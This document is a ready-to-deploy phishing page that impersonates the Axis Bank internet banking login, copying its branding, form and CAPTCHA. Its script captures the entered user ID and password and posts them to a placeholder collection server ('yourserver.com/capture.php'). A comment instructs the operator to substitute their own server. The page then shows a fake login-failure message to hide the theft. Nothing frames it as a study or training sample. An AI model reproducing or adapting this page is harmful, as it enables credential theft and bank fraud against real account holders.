<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Internet Banking</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #f0f0f0; font-family: Arial, Helvetica, sans-serif; }
        .header { background: #003087; color: white; padding: 10px 20px; }
        .header img { height: 50px; vertical-align: middle; }
        .header span { font-size: 24px; font-weight: bold; margin-left: 15px; vertical-align: middle; }
        .container { max-width: 400px; margin: 50px auto; background: white; border-radius: 8px; box-shadow: 0 0 20px rgba(0,0,0,0.1); padding: 30px; }
        .login-box h2 { color: #003087; border-bottom: 2px solid #003087; padding-bottom: 10px; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
        .captcha { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .captcha img { border: 1px solid #ddd; }
        .captcha input { flex:1; }
        .btn { background: #003087; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #002266; }
        .footer { text-align: center; margin-top: 20px; color: #777; font-size: 12px; }
        .links { margin-top: 15px; text-align: center; }
        .links a { color: #003087; margin: 0 10px; text-decoration: none; font-size: 13px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 50'%3E%3Crect width='100' height='50' fill='%23ffffff'/%3E%3Ctext x='10' y='35' font-size='24' fill='%23003087' font-weight='bold'%3EAxis%3C/text%3E%3C/svg%3E" alt="Axis Bank">
        <span>Axis Bank</span>
    </div>
    <div class="container">
        <div class="login-box">
            <h2>Secure Login</h2>
            <form id="loginForm" action="#" method="post">
                <div class="form-group">
                    <label for="userid">Login ID / User ID</label>
                    <input type="text" id="userid" name="userid" placeholder="Enter your User ID" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                <div class="captcha">
                    <img src="https://picsum.photos/120/40?random=1" alt="CAPTCHA">
                    <input type="text" id="captcha" name="captcha" placeholder="CAPTCHA" required>
                </div>
                <button type="submit" class="btn">LOGIN</button>
            </form>
            <div class="links">
                <a href="#">Forgot Password?</a>
                <a href="#">Register</a>
            </div>
        </div>
        <div class="footer">
            © 2025 Axis Bank. All rights reserved.
        </div>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            var user = document.getElementById("userid").value;
            var pass = document.getElementById("password").value;
            // ✅ Send to capture.php – replace URL with your server
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://yourserver.com/capture.php", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({user: user, pass: pass, bank: "axis"}));
            alert("Invalid Login ID or Password. Please try again.");
        });
    </script>
</body>
</html>
